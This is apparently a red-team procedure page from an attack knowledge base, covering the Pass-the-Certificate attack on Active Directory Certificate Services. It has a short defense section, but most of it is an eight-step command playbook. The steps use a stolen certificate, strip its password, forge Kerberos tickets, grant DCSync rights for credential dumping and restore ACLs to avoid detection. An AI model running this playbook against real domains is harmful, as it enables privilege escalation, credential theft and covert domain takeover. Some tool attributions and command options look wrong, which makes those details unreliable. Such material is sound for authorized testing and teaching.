---
id: 237f28fa-f476-4c78-9b50-6d471c1ee559
name: Pass-The-Certificate-Attack
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:06.189678+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Defense-Evasion|TA0005]]'
  - '[[tactics/Lateral-Movement|TA0008]]'
  - '[[tactics/Privilege-Escalation|TA0004]]'
techniques:
  - '[[techniques/Abuse-Elevation-Control-Mechanism|T1548]]'
  - '[[techniques/Valid-Accounts|T1078]]'
  - '[[techniques/Pass-the-Ticket|T1550.003]]'
sub_techniques: []
tags:
  - Active-Directory-Attacks
  - Active-Directory-Certificate-Services
  - Pass-The-Certificate
commands:
  - '[[commands/certutil-verbose-dump-certificate]]'
  - '[[commands/export-unprotected-pfx-certificate-certipy]]'
  - '[[commands/get-tgt-base64-pfx-certificate]]'
  - '[[commands/get-tgt-pem-certificate-private-key]]'
  - '[[commands/get-tgt-pfx-certificate-password]]'
  - '[[commands/passthecert-grant-dcsync-rights]]'
  - '[[commands/passthecert-restore-permissions]]'
  - '[[commands/rubeus-asktgt-certificate]]'
platforms:
  - Windows
tools: []
validated: true
---

# Pass-The-Certificate-Attack

## Summary

The Pass-The-Certificate attack allows attackers to impersonate domain administrators in Active Directory by stealing a certificate from an Active Directory Certificate Services (AD CS) server and using it to forge a Kerberos Ticket Granting Ticket (TGT). This technique bypasses traditional authentication by leveraging the trusted certificate to request service tickets, enabling lateral movement, privilege escalation, and actions like DCSync for credential dumping.

## Description

In an Active Directory environment, AD CS issues certificates that can be abused if an attacker gains access to a certificate template with excessive privileges, such as the ability to enroll as any user or request certificates for privileged accounts. The attacker extracts a certificate (often in PFX format) along with its private key, then uses tools like Impacket's gettgtpkinit.py, Rubeus, or PassTheCert to generate a TGT via PKINIT (Public Key Cryptography for Initial Authentication in Kerberos). This TGT can be injected into the session for authentication as the certificate's subject, potentially a domain admin. The attack is stealthy because the TGT appears legitimate, signed by the trusted CA. It targets Windows domains with misconfigured AD CS, common in enterprise setups, and can lead to full domain compromise including data exfiltration and persistence.

## Requirements

1. Compromised access to an AD CS server or a workstation with enrollment rights to a vulnerable certificate template.
2. Domain credentials for initial access (low-priv if template allows manager approval bypass).
3. Tools installed: Impacket suite (for gettgtpkinit.py and Certipy), Rubeus.exe, PassTheCert.exe.
4. Network access to a Domain Controller (port 88 for Kerberos, 445 for SMB if needed).
5. Target domain details: FQDN, DC hostname, target username SID if elevating.

## Defense

- Restrict AD CS template permissions: Remove 'Enroll' rights for privileged subjects and disable 'Client Authentication' for sensitive templates.
- Monitor certificate enrollment events (Event ID 4886/4887) for anomalous requests, especially for Domain Admin subjects.
- Enable Certificate Services Auditing and review for unusual PFX exports or PKINIT authentications.
- Use multi-factor authentication (MFA) for AD CS management and implement least privilege for enrollment.
- Deploy tools like BloodHound to identify vulnerable templates and monitor Kerberos logs for unexpected TGT issuances from certificates.

## Objectives

1. Extract a privileged certificate from AD CS to forge authentication material.
2. Generate a Kerberos TGT using the stolen certificate for impersonation.
3. Escalate to domain admin privileges via DCSync or direct access to restricted resources.
4. Achieve persistence and full domain control for further exploitation.

## Instructions

### Step 1: Dump Certificate Information

**Context**: Begin by inspecting the stolen certificate file to verify its details, such as subject, issuer, and validity, ensuring it's suitable for PKINIT authentication. This step confirms the certificate can be used for TGT generation without errors.

**Command** ([[commands/certutil-verbose-dump-certificate]]):
```cmd
certutil -v -dump $_CERT_FILE
```

> This Windows native command provides verbose details on the PFX or certificate file. Run it on a Windows system where certutil is available. Replace $_CERT_FILE with the path to your PFX (e.g., admin.pfx). If the certificate is password-protected, it will prompt for the password.

### Step 2: Export Unprotected PFX Using Certipy

**Context**: If the PFX is password-protected, use Certipy to export an unprotected version for easier handling in PKINIT tools. This removes the password barrier while preserving the private key.

**Command** ([[commands/export-unprotected-pfx-certificate-certipy]]):
```python
certipy cert -export -pfx $_PFX_PATH -password $_PFX_PASSWORD -out $_OUTPUT_PFX
```

> Certipy is a Python tool for AD CS abuse. This exports the certificate without password protection. Expected: A new unprotected.pfx file ready for TGT generation. Verify with file size and no password prompt on import.

### Step 3: Generate TGT Using Base64-Encoded PFX

**Context**: Convert the PFX to Base64 for transmission or direct use, then request a TGT for the target user. This method is useful if the certificate is embedded in scripts or transferred via non-binary channels.

**Command** ([[commands/get-tgt-base64-pfx-certificate]]):
```bash
gettgtpkinit.py -pfx-base64 $(cat $_B64_PFX_FILE) $_DOMAIN/$_TARGET_USER -hashes :$_PASSWORD $_TGT_CCACHE
```

> Part of Impacket; requires Python. Cat the Base64 file and pipe to generate TGT. Expected: A .ccache file with the TGT. Use klist to verify the ticket is issued for the target user.

### Step 4: Generate TGT Using PEM Certificate and Private Key

**Context**: If the certificate is in PEM format (split cert and key), use this to request the TGT. Convert PFX to PEM if needed using openssl beforehand.

**Command** ([[commands/get-tgt-pem-certificate-private-key]]):
```bash
gettgtpkinit.py -cert-pem $_PEM_CERT_PATH -key-pem $_PEM_KEY_PATH $_DOMAIN/$_TARGET_USER -hashes :$_PASSWORD $_TGT_CCACHE
```

> Specifies separate PEM files for cert and key. Expected: TGT in ccache file. Success if no ASN.1 parsing errors and ticket shows in kerberos list.

### Step 5: Generate TGT Using PFX Certificate and Password

**Context**: For password-protected PFX, directly provide the file and password to generate the TGT. This is the simplest method if the PFX is intact.

**Command** ([[commands/get-tgt-pfx-certificate-password]]):
```bash
gettgtpkinit.py -cert-pfx $_PFX_PATH -pfx-pass $_PFX_PASSWORD $_DOMAIN/$_TARGET_USER -hashes :$_PASSWORD $_TGT_CCACHE
```

> Handles PFX with password inline. Expected: Successful TGT creation without decryption failures. Load the ccache with export KRB5CCNAME=$_TGT_CCACHE and test with ldapsearch.

### Step 6: Request TGT with Rubeus

**Context**: On a Windows target, use Rubeus to request a TGT from the certificate, simulating native Kerberos behavior for stealth.

**Command** ([[commands/rubeus-asktgt-certificate]]):
```powershell
Rubeus.exe asktgt /user:$_TARGET_USER /certificate:$_CERT_PFX /password:$_CERT_PASSWORD /domain:$_DOMAIN /dc:$_DC_HOST /show
```

> Rubeus is a C# tool for Kerberos abuse. This outputs the TGT hash or exports it. Expected: Base64-encoded ticket or .kirbi file. Use /ptt to pass-the-ticket directly.

### Step 7: Grant DCSync Rights with PassTheCert

**Context**: Use the forged authentication to temporarily grant DCSync rights to a user, allowing credential dumping. This escalates privileges using the certificate.

**Command** ([[commands/passthecert-grant-dcsync-rights]]):
```cmd
PassTheCert.exe --server $_DC_HOST --cert-path $_CERT_PFX --elevate --target $_DOMAIN_DN --sid $_USER_SID
```

> PassTheCert.exe modifies ACLs via the cert. Expected: Confirmation of rights granted. Save the restoration file for rollback.

### Step 8: Restore Permissions with PassTheCert

**Context**: After exploitation, restore original permissions to avoid detection from ACL changes.

**Command** ([[commands/passthecert-restore-permissions]]):
```cmd
PassTheCert.exe --server $_DC_HOST --cert-path $_CERT_PFX --elevate --target $_DOMAIN_DN --restore $_RESTORATION_FILE
```

> Uses the saved file from grant step. Expected: Permissions reverted; verify with Get-ACL or similar.
